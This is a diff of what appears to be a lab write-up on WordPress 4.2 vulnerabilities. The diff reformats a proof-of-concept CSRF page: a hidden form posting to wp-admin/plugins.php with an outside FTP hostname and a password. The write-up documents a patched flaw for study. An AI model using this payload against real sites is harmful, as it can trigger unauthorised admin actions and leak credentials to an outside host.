@@ -40,18 +40,18 @@ Time spent: **X** hours spent in total
     - Fixed in version: 4.2.15
   - [x] GIF Walkthrough:
   - [x] Steps to recreate: Create an HTML file with a hidden submission form
-        ```html
-        <html>
-   <body>
-      <form action="http://wpdistillery.dev/wp-admin/plugins.php" method="POST">
-         <input type="hidden" name="hostname" value="sumofpwn.nl" />
-         <input type="hidden" name="connection_type" value="ftp" />
-         <input type="hidden" name="password" value="password" />
-         <input type="submit" value="Submit request" />
-      </form>
-   </body>
-</html>
-        ```
+
+            <html>
+                <body>
+                    <form action="http://wpdistillery.dev/wp-admin/plugins.php" method="POST">
+                        <input type="hidden" name="hostname" value="sumofpwn.nl" />
+                        <input type="hidden" name="connection_type" value="ftp" />
+                        <input type="hidden" name="password" value="password" />
+                        <input type="submit" value="Submit request" />
+                    </form>
+                </body>
+            </html>
+
   - [x] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2/src/wp-admin/includes/file.php)
 1. (Optional) Pupload Same Origin Method Execution (SOME)
